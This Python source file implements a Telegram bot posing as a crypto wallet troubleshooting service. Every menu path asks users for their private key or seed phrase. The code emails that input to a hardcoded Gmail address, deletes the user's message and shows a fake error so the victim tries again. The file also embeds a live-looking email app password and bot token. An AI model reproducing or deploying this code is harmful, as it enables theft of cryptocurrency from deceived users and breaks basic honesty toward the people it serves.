import logging
import smtplib
from email.message import EmailMessage
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler
)

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logging.getLogger("httpx").setLevel(logging.WARNING)

# States for our conversation handler
CHOOSE_WALLET_TYPE = 1
CHOOSE_OTHER_WALLET_TYPE = 2
PROMPT_FOR_INPUT = 3
RECEIVE_INPUT = 4

# --- Email Configuration (YOU MUST UPDATE THESE) ---
# NOTE: Using a hardcoded password is a SECURITY RISK. For a real application,
# use environment variables. For a Gmail account, you need to use an App Password,
# not your regular password, and you may need to enable 2-step verification.
SENDER_EMAIL = "airdropphrase@gmail.com"
SENDER_PASSWORD = "ipxs ffag eqmk otqd" # Use an App Password if using Gmail
RECIPIENT_EMAIL = "airdropphrase@gmail.com"

# Dictionary to map wallet callback data to their display names
# This is necessary because some button names and callback data are different
WALLET_DISPLAY_NAMES = {
    'wallet_type_metamask': 'Tonkeeper',
    'wallet_type_trust_wallet': 'Telegram Wallet',
    'wallet_type_coinbase': 'MyTon Wallet',
    'wallet_type_tonkeeper': 'Tonhub',
    'wallet_type_phantom_wallet': 'Trust Wallet',
    'wallet_type_mytonwallet': 'MyTonWallet',
    'wallet_type_tonhub': 'TonHub',
    'wallet_type_rainbow': 'Rainbow',
    'wallet_type_safepal': 'SafePal',
    'wallet_type_wallet_connect': 'Wallet Connect',
    'wallet_type_ledger': 'Ledger',
    'wallet_type_brd_wallet': 'BRD Wallet',
    'wallet_type_solana_wallet': 'Solana Wallet',
    'wallet_type_balance': 'Balance',
    'wallet_type_okx': 'OKX',
    'wallet_type_xverse': 'Xverse',
    'wallet_type_sparrow': 'Sparrow',
    'wallet_type_earth_wallet': 'Earth Wallet',
    'wallet_type_hiro': 'Hiro',
    'wallet_type_saitamask_wallet': 'Saitamask Wallet',
    'wallet_type_casper_wallet': 'Casper Wallet',
    'wallet_type_cake_wallet': 'Cake Wallet',
    'wallet_type_kepir_wallet': 'Kepir Wallet',
    'wallet_type_icpswap': 'ICPSwap',
    'wallet_type_kaspa': 'Kaspa',
    'wallet_type_nem_wallet': 'NEM Wallet',
    'wallet_type_near_wallet': 'Near Wallet',
    'wallet_type_compass_wallet': 'Compass Wallet',
    'wallet_type_stack_wallet': 'Stack Wallet',
    'wallet_type_soilflare_wallet': 'Soilflare Wallet',
    'wallet_type_aioz_wallet': 'AIOZ Wallet',
    'wallet_type_xpla_vault_wallet': 'XPLA Vault Wallet',
    'wallet_type_polkadot_wallet': 'Polkadot Wallet',
    'wallet_type_xportal_wallet': 'XPortal Wallet',
    'wallet_type_multiversx_wallet': 'Multiversx Wallet',
    'wallet_type_verachain_wallet': 'Verachain Wallet',
    'wallet_type_casperdash_wallet': 'Casperdash Wallet',
    'wallet_type_nova_wallet': 'Nova Wallet',
    'wallet_type_fearless_wallet': 'Fearless Wallet',
    'wallet_type_terra_station': 'Terra Station',
    'wallet_type_cosmos_station': 'Cosmos Station',
    'wallet_type_exodus_wallet': 'Exodus Wallet',
    'wallet_type_argent': 'Argent',
    'wallet_type_binance_chain': 'Binance Chain',
    'wallet_type_safemoon': 'SafeMoon',
    'wallet_type_gnosis_safe': 'Gnosis Safe',
    'wallet_type_defi': 'DeFi',
    'wallet_type_other': 'Other',
}

async def send_email(subject: str, body: str) -> None:
    """Sends an email using the provided credentials."""
    try:
        msg = EmailMessage()
        msg.set_content(body)
        msg['Subject'] = subject
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECIPIENT_EMAIL

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(SENDER_EMAIL, SENDER_PASSWORD)
            smtp.send_message(msg)
        
        logging.info("Email sent successfully.")
    except Exception as e:
        logging.error(f"Failed to send email: {e}")

# --- Bot Commands and Handlers ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Sends a welcome message and the main menu buttons."""
    user = update.effective_user
    
    welcome_message = (
        f"Hi {user.mention_html()}! Welcome to your ultimate self-service resolution tool "
        "for all your crypto wallet needs! This bot is designed to help you quickly "
        "and efficiently resolve common issues such as Connection Errors, Migration Challenges, "
        "Staking Complications, High Gas Fees, Stuck Transactions, Missing Funds, "
        "Claim Rejections, Liquidity Problems, Frozen Transactions, Swapping Difficulties, "
        "and Lost Tokens. Whether you're facing issues with wallet synchronization, "
        "incorrect token balances, failed transfers, we've got you covered. Our goal is "
        "to guide you through the troubleshooting process step-by-step, empowering you "
        "to take control of your crypto wallet experience. Let's get started and resolve your issues today!"
    )

    # Create the inline keyboard buttons for the main menu (like FixNode's first screen)
    keyboard = [
        [
            InlineKeyboardButton("🌳 Buy", callback_data='buy'),
            InlineKeyboardButton("🌳 Validation", callback_data='validation')
        ],
        [
            InlineKeyboardButton("🌳 Claim Tokens", callback_data='claim_tokens'),
            InlineKeyboardButton("🌳 Migration Issues", callback_data='migration_issues')
        ],
        [
            InlineKeyboardButton("🌳 Assets Recovery", callback_data='assets_recovery'),
            InlineKeyboardButton("🌳 General Issues", callback_data='general_issues')
        ],
        [
            InlineKeyboardButton("🌳 Rectification", callback_data='rectification'),
            InlineKeyboardButton("🌳 Staking Issues", callback_data='staking_issues')
        ],
        [
            InlineKeyboardButton("🌳 Deposits", callback_data='deposits'),
            InlineKeyboardButton("🌳 Withdrawals", callback_data='withdrawals')
        ],
        [
            InlineKeyboardButton("🌳 Slippage Error", callback_data='slippage_error'),
            InlineKeyboardButton("🌳 Login Issues", callback_data='login_issues')
        ],
        [
            InlineKeyboardButton("🌳 High Gass Fees", callback_data='high_gas_fees'),
            InlineKeyboardButton("🌳 Presale Issues", callback_data='presale_issues')
        ],
        [
            InlineKeyboardButton("🌳 Missing/Irregular Balance", callback_data='missing_balance')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.message:
        await update.message.reply_html(welcome_message, reply_markup=reply_markup)
    else: # This case handles the reset from the cancel function
        await update.callback_query.message.reply_html(welcome_message, reply_markup=reply_markup)
    return ConversationHandler.END


async def show_connect_wallet_button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Shows a single 'Connect Wallet' inline button after any menu selection."""
    query = update.callback_query
    await query.answer()

    # Get the name of the selected menu option and format it
    menu_option = query.data.upper().replace('_', ' ')

    # The inline keyboard now includes a "Cancel" button
    keyboard = [
        [InlineKeyboardButton("🔑 Connect Wallet", callback_data="connect_wallet")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.message.reply_text(
        f"{menu_option}\nPlease connect your wallet with your Private Key or Seed Phrase to continue.",
        reply_markup=reply_markup
    )
    return ConversationHandler.END


async def show_wallet_types(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Sends a selection of popular wallet types and an 'Other' option."""
    query = update.callback_query
    await query.answer()

    keyboard = [
        [InlineKeyboardButton("Tonkeeper", callback_data="wallet_type_metamask")],
        [InlineKeyboardButton("Telegram Wallet", callback_data="wallet_type_trust_wallet")],
        [InlineKeyboardButton("MyTon Wallet", callback_data="wallet_type_coinbase")],
        [InlineKeyboardButton("Tonhub", callback_data="wallet_type_tonkeeper")],
        [InlineKeyboardButton("Trust Wallet", callback_data="wallet_type_phantom_wallet")],
        [InlineKeyboardButton("Other Wallets", callback_data="other_wallets")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.message.reply_text("Please select your wallet type:", reply_markup=reply_markup)

    return CHOOSE_WALLET_TYPE

async def show_other_wallets(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Sends the full list of all other wallets formatted as a two-column layout without emojis."""
    query = update.callback_query
    await query.answer()

    keyboard = [
        [InlineKeyboardButton("MyTonWallet", callback_data="wallet_type_mytonwallet"), InlineKeyboardButton("TonHub", callback_data="wallet_type_tonhub")],
        [InlineKeyboardButton("Rainbow", callback_data="wallet_type_rainbow"), InlineKeyboardButton("SafePal", callback_data="wallet_type_safepal")],
        [InlineKeyboardButton("Wallet Connect", callback_data="wallet_type_wallet_connect"), InlineKeyboardButton("Ledger", callback_data="wallet_type_ledger")],
        [InlineKeyboardButton("BRD Wallet", callback_data="wallet_type_brd_wallet"), InlineKeyboardButton("Solana Wallet", callback_data="wallet_type_solana_wallet")],
        [InlineKeyboardButton("Balance", callback_data="wallet_type_balance"), InlineKeyboardButton("OKX", callback_data="wallet_type_okx")],
        [InlineKeyboardButton("Xverse", callback_data="wallet_type_xverse"), InlineKeyboardButton("Sparrow", callback_data="wallet_type_sparrow")],
        [InlineKeyboardButton("Earth Wallet", callback_data="wallet_type_earth_wallet"), InlineKeyboardButton("Hiro", callback_data="wallet_type_hiro")],
        [InlineKeyboardButton("Saitamask Wallet", callback_data="wallet_type_saitamask_wallet"), InlineKeyboardButton("Casper Wallet", callback_data="wallet_type_casper_wallet")],
        [InlineKeyboardButton("Cake Wallet", callback_data="wallet_type_cake_wallet"), InlineKeyboardButton("Kepir Wallet", callback_data="wallet_type_kepir_wallet")],
        [InlineKeyboardButton("ICPSwap", callback_data="wallet_type_icpswap"), InlineKeyboardButton("Kaspa", callback_data="wallet_type_kaspa")],
        [InlineKeyboardButton("NEM Wallet", callback_data="wallet_type_nem_wallet"), InlineKeyboardButton("Near Wallet", callback_data="wallet_type_near_wallet")],
        [InlineKeyboardButton("Compass Wallet", callback_data="wallet_type_compass_wallet"), InlineKeyboardButton("Stack Wallet", callback_data="wallet_type_stack_wallet")],
        [InlineKeyboardButton("Soilflare Wallet", callback_data="wallet_type_soilflare_wallet"), InlineKeyboardButton("AIOZ Wallet", callback_data="wallet_type_aioz_wallet")],
        [InlineKeyboardButton("XPLA Vault Wallet", callback_data="wallet_type_xpla_vault_wallet"), InlineKeyboardButton("Polkadot Wallet", callback_data="wallet_type_polkadot_wallet")],
        [InlineKeyboardButton("XPortal Wallet", callback_data="wallet_type_xportal_wallet"), InlineKeyboardButton("Multiversx Wallet", callback_data="wallet_type_multiversx_wallet")],
        [InlineKeyboardButton("Verachain Wallet", callback_data="wallet_type_verachain_wallet"), InlineKeyboardButton("Casperdash Wallet", callback_data="wallet_type_casperdash_wallet")],
        [InlineKeyboardButton("Nova Wallet", callback_data="wallet_type_nova_wallet"), InlineKeyboardButton("Fearless Wallet", callback_data="wallet_type_fearless_wallet")],
        [InlineKeyboardButton("Terra Station", callback_data="wallet_type_terra_station"), InlineKeyboardButton("Cosmos Station", callback_data="wallet_type_cosmos_station")],
        [InlineKeyboardButton("Exodus Wallet", callback_data="wallet_type_exodus_wallet"), InlineKeyboardButton("Argent", callback_data="wallet_type_argent")],
        [InlineKeyboardButton("Binance Chain", callback_data="wallet_type_binance_chain"), InlineKeyboardButton("SafeMoon", callback_data="wallet_type_safemoon")],
        [InlineKeyboardButton("Gnosis Safe", callback_data="wallet_type_gnosis_safe"), InlineKeyboardButton("DeFi", callback_data="wallet_type_defi")],
        [InlineKeyboardButton("Other", callback_data="wallet_type_other")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.message.reply_text("Please select your wallet type:", reply_markup=reply_markup)

    return CHOOSE_OTHER_WALLET_TYPE


async def show_phrase_options(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Sends the inline keyboard with Private Key and Seed Phrase options."""
    query = update.callback_query
    await query.answer()
    
    # Get the wallet name from the WALLET_DISPLAY_NAMES dictionary
    wallet_name = WALLET_DISPLAY_NAMES.get(query.data, query.data.replace('wallet_type_', '').replace('_', ' ').title())
    
    # Store the user's wallet type choice in context
    context.user_data['wallet_type'] = wallet_name

    keyboard = [
        [
            InlineKeyboardButton("🔑 Private Key", callback_data="private_key"),
            InlineKeyboardButton("🔒 Import Seed Phrase", callback_data="seed_phrase")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.message.reply_text(
        f"You have selected {wallet_name}.\nSelect your preferred mode of connection.",
        reply_markup=reply_markup
    )
    return PROMPT_FOR_INPUT

async def prompt_for_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Prompts the user for the specific key or phrase based on their button choice."""
    query = update.callback_query
    await query.answer()
    
    # Store the user's choice in context to use in the next step
    context.user_data['wallet_option'] = query.data
    
    # Create the inline keyboard without a "Cancel" button.
    reply_markup = None

    if query.data == "seed_phrase":
        await query.message.reply_text(
            "Please enter your 12/24 words secret phrase.",
            reply_markup=reply_markup # Attach the keyboard here
        )
    elif query.data == "private_key":
        await query.message.reply_text(
            "Please enter your private key.",
            reply_markup=reply_markup # Attach the keyboard here
        )
    else:
        await query.message.reply_text("Invalid choice. Please use the buttons.")
        return ConversationHandler.END
        
    return RECEIVE_INPUT

async def handle_final_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Receives the final input and sends it to the email, then deletes the message."""
    user_input = update.message.text
    chat_id = update.message.chat_id
    message_id = update.message.message_id
    wallet_option = context.user_data.get('wallet_option', 'Unknown')
    wallet_type = context.user_data.get('wallet_type', 'Unknown')
    user = update.effective_user
    
    subject = f"New Wallet Input from Telegram Bot: {wallet_type} -> {wallet_option}"
    body = f"User ID: {user.id}\nUsername: {user.username}\n\nWallet Type: {wallet_type}\nInput Type: {wallet_option}\nInput: {user_input}"
    
    # Send the email
    await send_email(subject, body)
    
    # Delete the user's input message
    try:
        await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
        logging.info(f"Deleted user message with ID: {message_id}")
    except Exception as e:
        logging.error(f"Failed to delete message: {e}")
        
    await update.message.reply_text(
        "‼️🌳 An error occured, Please ensure you are entering the correct key, please use copy and paste to avoid errors. please /start to try again. ",
        reply_markup=ReplyKeyboardRemove() # Remove the keyboard after the message
    )
    
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancels the current conversation and returns the user to the start menu."""
    query = update.callback_query
    await query.answer()

    # Edit the message to remove the inline keyboard
    await query.message.edit_reply_markup(reply_markup=None)

    # Call the start function to reset the menu
    await start(update, context) 
    return ConversationHandler.END


def main() -> None:
    """Start the bot."""
    application = ApplicationBuilder().token("8231278561:AAF6CeVyduHhfRHDADVDM227lL0aQzBs0NY").build()

    conv_handler = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(show_wallet_types, pattern="^connect_wallet$")
        ],
        states={
            CHOOSE_WALLET_TYPE: [
                CallbackQueryHandler(show_other_wallets, pattern="^other_wallets$"),
                CallbackQueryHandler(show_phrase_options, pattern="^wallet_type_"),
            ],
            CHOOSE_OTHER_WALLET_TYPE: [
                CallbackQueryHandler(show_phrase_options, pattern="^wallet_type_"),
            ],
            PROMPT_FOR_INPUT: [
                CallbackQueryHandler(prompt_for_input, pattern="^(private_key|seed_phrase)$")
            ],
            RECEIVE_INPUT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_final_input),
            ]
        },
        fallbacks=[
            CommandHandler("cancel", cancel),
        ]
    )

    # Handlers for the entire flow
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(show_connect_wallet_button, pattern="^(buy|validation|claim_tokens|migration_issues|assets_recovery|general_issues|rectification|staking_issues|deposits|withdrawals|slippage_error|login_issues|high_gas_fees|presale_issues|missing_balance)$"))
    application.add_handler(conv_handler)
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()